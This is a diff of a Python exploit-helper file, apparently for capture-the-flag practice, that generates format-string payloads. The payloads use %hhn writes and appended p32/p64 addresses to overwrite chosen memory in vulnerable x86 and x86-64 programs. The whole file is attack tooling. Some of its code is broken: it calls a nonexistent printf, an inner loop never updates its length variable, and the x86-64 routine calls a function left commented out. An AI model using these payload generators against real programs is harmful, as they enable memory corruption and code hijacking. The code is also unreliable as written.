@@ -28,11 +28,18 @@ def calculate_next_fmt_string_field_width_char(bytes_written, target_next_byte,d
 # dst: the address to get written to, as an integer
 # buf_length: the length of the buffer of A's (and other content) prior to the 
 #      location in the payload referenced by dpn
-def gen_fmt_string_write_x86_first_half(src, dpn):
+def gen_candidate_fmt_string(src, dpn, mode="x86"):
+    if mode=="x86":
+        n_char_writes = 4
+    elif mode=="x86-64":
+        n_char_writes = 8
+    else:
+        printf("In gen_fmt_string: unsupported architecture!")
+        exit(0)
     n_bytes_written = 0
     payload = b""
     # Writing four chars
-    for i in range(4):
+    for i in range(n_char_writes):
         #byte_to_write = ord(src[i]) # old approach for python2
         byte_to_write = src[i]
         #last_byte_of_n_bytes_written = n_bytes_written % 256
@@ -53,17 +60,68 @@ def gen_fmt_string_write_x86_first_half(src, dpn):
     return(payload)
 
 # Main function: takes src (what to write) and dst (what to write to) as integers. 
-def gen_fmt_string_write_exploit_x86(src, dst, dpn, buf_length):
-    fmt_string = gen_fmt_string_write_x86_first_half(p32(src), dpn)
+def gen_x86_fmt_string(src, dst, dpn, buf_length):
+    #fmt_string = gen_fmt_string_write_x86_first_half(p32(src), dpn)
+    done = False
+    while not done:
+        fmt_string = gen_candidate_fmt_string(p32(src), dpn, mode="x86")
+        a = len(fmt_string)
+        if a <= buf_length:
+            fmt_string += b'A'*(buf_length - a)
+            done = True
+        else:
+            while a > buf_length:
+                dpn += 1
+                buf_length += 4
+                # Now recompute the format string with the new dpn and buf_length.
+                # This is necessary because sometimes the number of digits in the 
+                # parameter numbers in the format string will change, or 
+                # the number of digits in the field widths in the format string 
+                # will change. 
+    # Add the pointers at the end.
+    for i in range(4):
+        fmt_string += p32(dst+i)
+    return fmt_string
+
+'''
+# Deprecated.
+def gen_fmt_string_write_x86_64_first_half(src, dpn):
+    n_bytes_written = 0
+    payload = b""
+    # Writing eight chars
+    for i in range(8):
+        #byte_to_write = ord(src[i]) # old approach for python2
+        byte_to_write = src[i]
+        #last_byte_of_n_bytes_written = n_bytes_written % 256
+        # The field width means we'll sometimes print 8 bytes even if the 
+        # minimum width is less
+        #n_bytes_to_write_this_round = byte_to_write - last_byte_of_n_bytes_written
+        #if n_bytes_to_write_this_round < 8:
+        #    n_bytes_to_write_this_round += 256
+        #
+        field_width = calculate_next_fmt_string_field_width_char(n_bytes_written, byte_to_write) 
+        payload += b"%"
+        payload += str(field_width).encode()
+        payload += b"x"
+        payload += b"%"
+        payload += str(dpn+i).encode()
+        payload += b"$hhn"
+        n_bytes_written += field_width
+    return(payload)
+'''
+
+# To do: fix this function so it's like the x86 one.
+def gen_fmt_string_write_exploit_x86_64(src, dst, dpn, buf_length):
+    fmt_string = gen_fmt_string_write_x86_64_first_half(p64(src), dpn)
     while len(fmt_string) > buf_length:
-        buf_length += 4
+        buf_length += 8
         dpn += 1
-        fmt_string = gen_fmt_string_write_x86_first_half(p32(src), dpn)
+        fmt_string = gen_fmt_string_write_x86_64_first_half(p64(src), dpn)
     # Add padding if necessary
     if buf_length - len(fmt_string) > 0:
         fmt_string += b"A"*(buf_length - len(fmt_string))
     # Locations where the chars are going to be written
     #print("In gen_fmt_string_write_exploit_x86: dst format = " + str(dst.__class__))
-    for i in range(4):
-        fmt_string += p32(dst+i)
+    for i in range(8):
+        fmt_string += p64(dst+i)
     return fmt_string
